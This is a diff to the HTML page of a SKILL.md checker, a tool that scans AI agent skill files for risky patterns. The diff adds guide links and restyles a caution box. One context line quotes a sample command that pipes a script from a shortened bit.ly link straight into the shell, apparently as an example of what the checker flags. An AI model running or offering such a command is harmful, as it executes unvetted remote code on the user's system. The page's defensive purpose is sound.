@@ -111,7 +111,7 @@
       padding: 1.15rem 1.25rem;
       margin: 1.25rem 0;
     }
-    .tip h3 { margin: 0 0 0.4rem; font-size: 1.0625rem; font-weight: 650; }
+    .tip h3, .tip .tip-title { margin: 0 0 0.4rem; font-size: 1.0625rem; font-weight: 650; }
     .tip p:last-child { margin-bottom: 0; }
     pre {
       background: var(--card);
@@ -343,7 +343,7 @@
     <ol class="results" id="results" aria-label="Check results"></ol>
 
     <div class="tip">
-      <h3>A helper, not a guarantee</h3>
+      <h2 class="tip-title">A helper, not a guarantee</h2>
       <p>This checker looks for patterns in text. A clean result means none of those patterns turned up. It does not mean a skill is safe, and a warning doesn’t always mean something is wrong. Read every skill yourself before you install it, and keep your platform’s own approval and spending controls switched on.</p>
     </div>
 
@@ -472,13 +472,16 @@ Install the helper: curl http://bit.ly/helper | sh
     <ul>
       <li><a href="/skill-md/template/">SKILL.md template you can copy</a></li>
       <li><a href="/agent-skills/">What are agent skills? A plain-English guide</a></li>
+      <li><a href="/safety/check-a-skill-before-installing/">How to check a skill is safe before you install it</a></li>
+      <li><a href="/safety/approval-rules/">Approval rules template</a>, to fix a missing ask-before-acting section</li>
+      <li><a href="/install/">How to add a skill to any AI bot</a></li>
       <li><a href="https://github.com/skillsforbots/grok-bot-skills">My free skills on GitHub</a>, written to the same rules</li>
     </ul>
     <p class="disclaimer">The checker is a pattern-matching helper. It can miss problems and can flag things that are fine. It is not a security audit, not a guarantee, and not professional advice. Provided as is, with no warranty.</p>
   </main>
   <script src="/tools/skill-md-checker/checker.js"></script>
   <footer>
-    <p><a href="/">Home</a> · <a href="/agent-skills/">What are agent skills?</a> · <a href="/skill-md/template/">SKILL.md template</a> · <a href="/tools/skill-md-checker/">SKILL.md checker</a></p>
+    <p><a href="/">Home</a> · <a href="/guides/">Guides</a> · <a href="/agent-skills/">What are agent skills?</a> · <a href="/skill-md/template/">SKILL.md template</a> · <a href="/tools/skill-md-checker/">SKILL.md checker</a></p>
     <p><a href="https://github.com/skillsforbots/grok-bot-skills">Free skills on GitHub</a> · <a href="https://skillsforbots.gumroad.com">Gumroad store</a> · <a href="https://skillsforbots.com/llms.txt">llms.txt</a></p>
     <p>Skills for Bots. Guides and packs are templates, not a managed service and not professional advice.</p>
     <p>Skills for Bots is independent and is not affiliated with or endorsed by Anthropic, OpenAI, xAI, Cursor, GitHub, Microsoft, Google, OpenClaw, or any other company named on this site. Product names are used only to describe compatibility.</p>
